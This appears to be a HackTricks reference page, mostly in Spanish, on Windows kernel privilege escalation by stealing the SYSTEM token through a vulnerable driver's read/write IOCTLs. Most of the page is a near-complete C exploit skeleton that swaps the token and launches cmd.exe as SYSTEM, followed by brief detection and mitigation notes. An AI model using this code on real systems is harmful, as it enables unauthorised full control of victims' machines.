# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Resumen

Si un driver vulnerable expone un IOCTL que le da a un atacante primitivas de lectura y/o escritura arbitraria en kernel, elevarse a NT AUTHORITY\SYSTEM a menudo se logra robando un Token de SYSTEM. La técnica copia el puntero Token desde el EPROCESS de un proceso SYSTEM al EPROCESS del proceso actual.

Por qué funciona:
- Cada proceso tiene una estructura EPROCESS que contiene (entre otros campos) un Token (en realidad un EX_FAST_REF a un objeto token).
- El proceso SYSTEM (PID 4) tiene un token con todos los privilegios habilitados.
- Reemplazar el EPROCESS.Token del proceso actual con el puntero al token de SYSTEM hace que el proceso actual se ejecute como SYSTEM inmediatamente.

> Los offsets en EPROCESS varían entre versiones de Windows. Determínalos dinámicamente (símbolos) o usa constantes específicas por versión. También recuerda que EPROCESS.Token es un EX_FAST_REF (los 3 bits bajos son banderas del contador de referencias).

## Pasos a alto nivel

1) Localiza la base de ntoskrnl.exe y resuelve la dirección de PsInitialSystemProcess.
- Desde user mode, usa NtQuerySystemInformation(SystemModuleInformation) o EnumDeviceDrivers para obtener las bases de los drivers cargados.
- Añade el offset de PsInitialSystemProcess (desde símbolos/reversing) a la base del kernel para obtener su dirección.
2) Lee el puntero en PsInitialSystemProcess → este es un puntero en kernel al EPROCESS de SYSTEM.
3) Desde el EPROCESS de SYSTEM, lee los offsets UniqueProcessId y ActiveProcessLinks para recorrer la lista doblemente enlazada de estructuras EPROCESS (ActiveProcessLinks.Flink/Blink) hasta encontrar el EPROCESS cuyo UniqueProcessId sea igual a GetCurrentProcessId(). Conserva ambos:
- EPROCESS_SYSTEM (para SYSTEM)
- EPROCESS_SELF (para el proceso actual)
4) Lee el valor del token de SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Enmascara los 3 bits bajos: Token_SYS_masked = Token_SYS & ~0xF (comúnmente ~0xF o ~0x7 dependiendo del build; en x64 se usan los 3 bits bajos — máscara 0xFFFFFFFFFFFFFFF8).
5) Opción A (común): Conserva los 3 bits bajos de tu token actual y únelos al puntero de SYSTEM para mantener consistente el contador de referencias embebido.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Escribe Token_NEW de vuelta en (EPROCESS_SELF + TokenOffset) usando tu primitiva de escritura en kernel.
7) Tu proceso actual ya es SYSTEM. Opcionalmente lanza un nuevo cmd.exe o powershell.exe para confirmar.

## Pseudocódigo

Below is a skeleton that only uses two IOCTLs from a vulnerable driver, one for 8-byte kernel read and one for 8-byte kernel write. Replace with your driver’s interface.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notas:
- Desplazamientos: Usa WinDbg’s `dt nt!_EPROCESS` con los PDBs del objetivo, o un runtime symbol loader, para obtener offsets correctos. No los codifiques a ciegas.
- Máscara: En x64 el token es un EX_FAST_REF; los 3 bits bajos son bits del contador de referencias. Conservar los bits bajos originales de tu token evita inconsistencias inmediatas en el refcount.
- Estabilidad: Prefiere elevar el proceso actual; si elevas un helper de corta duración puedes perder SYSTEM cuando termine.

## Detección y mitigación
- La carga de drivers de terceros no firmados o no confiables que exponen IOCTLs potentes es la causa raíz.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard y las reglas de Attack Surface Reduction pueden impedir que drivers vulnerables se carguen.
- EDR puede detectar secuencias sospechosas de IOCTL que implementen lectura/escritura arbitraria y token swaps.

## Referencias
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
